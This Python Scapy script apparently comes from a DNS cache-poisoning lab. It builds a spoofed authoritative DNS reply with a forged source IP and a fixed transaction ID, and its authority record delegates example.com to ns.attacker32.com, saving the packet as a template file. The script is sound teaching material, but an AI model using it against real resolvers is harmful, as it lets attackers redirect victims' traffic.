from scapy.all import *

def response_packet():
    # -----------------IP Layer---------------#
    ip = IP(src = '10.10.10.10', dst = '10.9.0.53', chksum=0)
    # ----------------------------------------#

    # -----------------Transport Layer---------------#
    udp = UDP(sport = 53, dport = 33333, chksum = 0)
    # -----------------------------------------------#

    # -----------------Application Layer---------------#
    name = 'twysw.example.com'
    no_pref_name = 'example.com'
    Qdsec = DNSQR(qname=name)
    Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
    NSsec = DNSRR(rrname=no_pref_name, type='NS', rdata='ns.attacker32.com', ttl=259200)
    dns = DNS(id = 0xAAAA, aa = 1, ra = 0, rd = 0, cd = 0, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)
    # ------------------------------------------------#

    # -----------------The Complete Packet---------------#
    dns_response = ip / udp / dns
    # ---------------------------------------------------#
    
    with open('dns_response.bin', 'wb') as f:
        f.write(bytes(dns_response))

if __name__ == "__main__":
    response_packet()
